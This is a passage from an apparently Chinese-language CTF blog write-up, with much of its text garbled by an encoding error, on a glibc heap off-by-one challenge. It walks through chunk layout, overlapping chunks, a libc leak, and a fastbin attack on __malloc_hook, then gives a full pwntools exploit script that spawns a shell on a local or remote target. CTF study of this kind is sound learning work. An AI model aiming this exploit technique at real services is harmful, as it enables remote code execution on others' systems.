<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/6.png" style="zoom: 67%;" />

<h3 id="B-Memory-Arrangement"><a href="#B-Memory-Arrangement" class="headerlink" title="B. Memory Arrangement"></a>B. Memory Arrangement</h3><p>â€‹        1.mallocå‡ºéœ€è¦çš„chunk</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x200</span>);	<span class="comment">//unsort chunk,</span></span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">0x50</span>);	<span class="comment">//overlap chunkï¼Œleak libc_base</span></span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">0x68</span>);	<span class="comment">//ä¿®æ”¹å…¶fdï¼Œç”¨äºfast attack</span></span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x1f8</span>);	<span class="comment">//æº¢å‡ºchunkï¼Œä¿®æ”¹ä¸‹ä¸€chunkçš„pre_sizeå’Œin_useå­—èŠ‚ï¼ˆç”¨åˆ°äº†off_by_oneæ¼æ´ï¼‰</span></span><br><span class="line">e = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);	<span class="comment">//victim chunkï¼Œè¢«æº¢å‡ºchunk</span></span><br><span class="line">barrier = <span class="built_in">malloc</span>(<span class="number">0x400</span>)	<span class="comment">//ç¡®ä¿ä»¥ä¸Šchunkä¸è¢«top chunkåˆå¹¶ã€‚</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/7.png" style="zoom:50%;" />

<p>â€‹        2.æŠŠaï¼Œcï¼Œdä¸‰ä¸ªchunké‡Šæ”¾ã€‚</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/8.png" style="zoom:50%;" />

<p>â€‹        3.å› ä¸ºDELå‡½æ•°ä¹Ÿç”¨åˆ°äº†read_in å‡½æ•°ï¼Œä¹Ÿå¯ä»¥è¿›è¡Œæº¢å‡ºï¼Œæ‰€ä»¥è¿™é‡ŒDEL(payload)ï¼Œpayloadå¤§å°ä¸º0x1f8ï¼Œè€Œchunk_då®é™…å¯å†™å¤§å°åªæœ‰0x1f0ï¼Œå› æ­¤å¯ä»¥åœ¨payloadçš„æœ€åå†™å…¥fake_pre_sizeï¼ŒåŒæ—¶è¦†å†™äº†chunk_eçš„pre_sizeå’Œin_useå­—èŠ‚ã€‚</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/9.png" style="zoom:50%;" />

<p>â€‹        4.ç°åœ¨é‡Šæ”¾chunk_eï¼Œç³»ç»Ÿå°†å¯»å€è‡³chunk_e - pre_size == chunk_e - 0x4e0 == chunk_a,ç³»ç»Ÿå°†chunk_a unlinkï¼Œç„¶ååˆå¹¶aåˆ°eçš„æ‰€æœ‰å†…å­˜ï¼Œå¹¶å…¥ä¸€ä¸ªunsort chunkã€‚</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/10.png" style="zoom:50%;" />

<p>â€‹        5.è€Œchunk_bè¿˜åœ¨ä½¿ç”¨ï¼Œé€ æˆäº†overlapã€‚</p>
<p>â€‹        6.æ¥ä¸‹æ¥malloc(0x200)ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡æ˜¯æŠŠåŸæ¥é‡Šæ”¾çš„chunk_aåˆ†é…å‡ºæ¥ï¼Œç¬¬äºŒæ¬¡æ˜¯åœ¨åæ¥è¢«ç³»ç»Ÿåˆå¹¶çš„å¤§chunkä¸­å‰²ä¸‹0x210çš„ç©ºé—´ï¼Œç„¶åè¿™ä¸ªå¤§chunkçš„åœ°å€å°†å’Œchunk_bé‡åˆã€‚ç”±äºåªæœ‰å¤§chunkä¸€ä¸ªunsort chunkåœ¨binä¸­ï¼Œå› æ­¤å…¶fdï¼ŒbkæŒ‡å‘main_arenaï¼Œäºæ˜¯å¯ä»¥æº¢å‡ºäº†ã€‚</p>
<h3 id="C-Leak-Libc-base-amp-get-shell"><a href="#C-Leak-Libc-base-amp-get-shell" class="headerlink" title="C. Leak Libc_base &amp; get shell"></a>C. Leak Libc_base &amp; get shell</h3><p>â€‹        1.GET(chunk_b)å¹¶é€šè¿‡è®¡ç®—å¯ä»¥å¾—åˆ°libc_baseï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç®—å‡ºmalloc_hookçš„åœ°å€ã€‚</p>
<p>â€‹        2.ç”¨one_gadgetå¾—åˆ°libcä¸­excute(â€œ/bin/shâ€);çš„åœ°å€</p>
<p>â€‹        3.malloc(0x100)ï¼Œå¯ä»¥å¾—åˆ°chunk_båˆ°chunk_b + 0x100çš„å†…å­˜ï¼Œç”¨æ¥å¡«å……chunk_bï¼Œå¹¶ç”¨malloc_hookçš„ä¸Šæ–¹åœ°å€è¦†å†™chunk_cçš„fdã€‚</p>
<p>â€‹        4.mallocä¸¤æ¬¡ï¼Œä»¥malloc_hookä¸Šæ–¹åœ°å€ä¸ºé¦–åœ°å€çš„chunkï¼Œå†™å…¥one_gadgetåˆ°malloc_hookï¼Œå®Œäº‹å„¿ã€‚ã€‚</p>
<h3 id="D-Exploit"><a href="#D-Exploit" class="headerlink" title="D  . Exploit"></a>D  . Exploit</h3><p>â€‹        è„šæœ¬è¿˜æ˜¯å¾—å‚è€ƒCTF-Wikiï¼Œè‡ªå·±çœŸæ˜¯è‚ä¸å‡ºæ¥ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span>:</span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">    PORT = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    DEBUG = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        PATH = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    p = process(PATH)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>) <span class="comment"># ubuntu 16.04</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">command_num</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command_num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span>(<span class="params">key, size, data</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;PUT&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;key:&#x27;</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;data:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; size:</span><br><span class="line">        p.send(data.ljust(size, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">key</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;DEL&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;key:&#x27;</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">key</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;GET&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;key:&#x27;</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27; bytes&#x27;</span>).strip(<span class="string">&#x27; bytes&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recv(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># avoid complicity of structure malloc</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        put(<span class="built_in">str</span>(i), <span class="number">0x38</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        delete(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># allocate what we want in order</span></span><br><span class="line">    put(<span class="string">&#x27;1&#x27;</span>, <span class="number">0x200</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;2&#x27;</span>, <span class="number">0x50</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;5&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;3&#x27;</span>, <span class="number">0x1f8</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;4&#x27;</span>, <span class="number">0xf0</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;defense&#x27;</span>, <span class="number">0x400</span>, <span class="string">&#x27;defense-data&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># free those need to be freed</span></span><br><span class="line">    delete(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x1f0</span> + p64(<span class="number">0x4e0</span>))</span><br><span class="line"></span><br><span class="line">    delete(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    put(<span class="string">&#x27;0x200&#x27;</span>, <span class="number">0x200</span>, <span class="string">&#x27;fillup&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;0x200 fillup&#x27;</span>, <span class="number">0x200</span>, <span class="string">&#x27;fillup again&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    libc_leak = u64(get(<span class="string">&#x27;2&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    p.info(<span class="string">&#x27;libc leak: 0x%x&#x27;</span> % libc_leak)</span><br><span class="line"></span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line">    p.info(<span class="string">&#x27;libc_base: 0x%x&#x27;</span> % libc_base)</span><br><span class="line"></span><br><span class="line">    put(<span class="string">&#x27;fastatk&#x27;</span>, <span class="number">0x100</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x58</span> + p64(<span class="number">0x71</span>) + p64(libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span> + <span class="number">5</span> - <span class="number">8</span>))</span><br><span class="line">    put(<span class="string">&#x27;prepare&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;prepare data&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">    put(<span class="string">&#x27;attack&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">3</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;DEL&#x27;</span>) <span class="comment"># malloc(8) triggers one_gadget</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>â€‹        ps.ä¸è¿‡æœ‰ä¸€ä¸ªåœ°æ–¹ä¸€ç›´æ²¡å¼„æ˜ç™½ï¼šå‰é¢è¯´çš„æ¯ä¸€æ¬¡PUTéƒ½ä¼šmallc()3æ¬¡ï¼Œè€Œä¸”ç†åº”æ˜¯è¿ç»­åœ°å€çš„ä¸‰ä¸ªchunkï¼Œä½†æ˜¯CTF-Wikiçš„è§£æ³•ï¼Œä»¥åŠå„ç§å…¶ä»–å¸ˆå‚…çš„è§£æ³•éƒ½åªè€ƒè™‘äº†data chunkï¼Œæˆ‘å’Œåˆ˜è€æ¿å€’æ˜¯è€ƒè™‘äº†ä¸‰ä¸ªchunkè¿ç»­çš„æƒ…å†µï¼Œä½†æ˜¯æˆ‘æ²¡æ•´å‡ºæ¥ã€‚æš‚æ—¶å…ˆæŒ‰ç…§writeupçš„æ¥å§ã€‚ã€‚ä¹‹åå†å›å¤´çœ‹çœ‹ã€‚</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/03/16/Off_By_One/" data-id="ckmlis0z30007s0lj67cq46rm" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2020/04/09/Vtable-Hijack(the_end)/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Vtable-Hijack(the_end)
        
      </div>
    </a>
  
  
    <a href="/2020/03/06/house-of-spirit/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">House_of_spirit</div>
    </a>
  
</nav>

  
</article>



</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">Bin FantasyğŸ¤¯</h1>
    <h2 class="blog-subtitle">You may found nothing here.</h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>ä¸»é¡µ</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>å½’æ¡£</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>åˆ†ç±»</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>æ ‡ç­¾</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
    <h2 class="author">Ash3n On3</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>14</strong><br>æ–‡ç« </div></a>
      <a href="/categories"><div><strong>0</strong><br>åˆ†ç±»</div></a>
      <a href="/tags"><div><strong>0</strong><br>æ ‡ç­¾</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
          Github
        </a>
      
    </div>

    <div class="friend-link">
      <h2>å‹é“¾</h2>
      
        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
          ShanaMaid
        </a>
      
    </div>
  </div>
</div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2020 - 2021 Ash3n On3<br>
      ç”±<a href="http://hexo.io/" target="_blank">Hexo</a>å¼ºåŠ›é©±åŠ¨ | 
      ä¸»é¢˜-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
    </div>
    
  </div>
</footer>
    </div>
    

<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  
<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">

  
<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>




  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>è‹Ÿåˆ©</span></li> 
    <li><span>å›½å®¶</span></li> 
    <li><span>ç”Ÿæ­»ä»¥</span></li> 
    <li><span>å²‚èƒ½</span></li> 
    <li><span>ç¥¸ç¦</span></li> 
    <li><span>è¶‹é¿ä¹‹</span></li> 
  </ul>
</section>

<script src="/js/script.js"></script>




  </div>
</body>
</html>